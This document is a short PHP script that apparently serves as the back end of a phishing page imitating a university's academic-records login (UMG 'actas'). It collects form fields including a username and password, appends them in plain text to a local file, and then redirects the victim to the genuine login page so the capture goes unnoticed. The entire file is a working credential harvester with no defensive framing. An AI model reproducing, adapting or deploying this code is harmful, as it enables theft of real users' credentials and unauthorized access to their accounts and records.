<?php
$semestre = $_POST['semestre'];
$anio = $_POST['anio'];
$codigo_carrera = $_POST['codigo_carrera'];
$codigo_curso = $_POST['codigo_curso'];
$seccion = $_POST['seccion'];
$evaluacion = $_POST['evaluacion'];
$username = $_POST['username'];
$password = $_POST['password'];
$fichero = fopen("umg.txt", "a");
fwrite($fichero,"$semestre".PHP_EOL);
fwrite($fichero,"$anio".PHP_EOL);
fwrite($fichero,"$codigo_carrera".PHP_EOL);
fwrite($fichero,"$codigo_curso".PHP_EOL);
fwrite($fichero,"$seccion".PHP_EOL);
fwrite($fichero,"$evaluacion".PHP_EOL);
fwrite($fichero,"$username".PHP_EOL);
fwrite($fichero,"$password".PHP_EOL);

fclose($fichero);
header('location: https://apps1.umg.edu.gt/actas/login.php');
?>
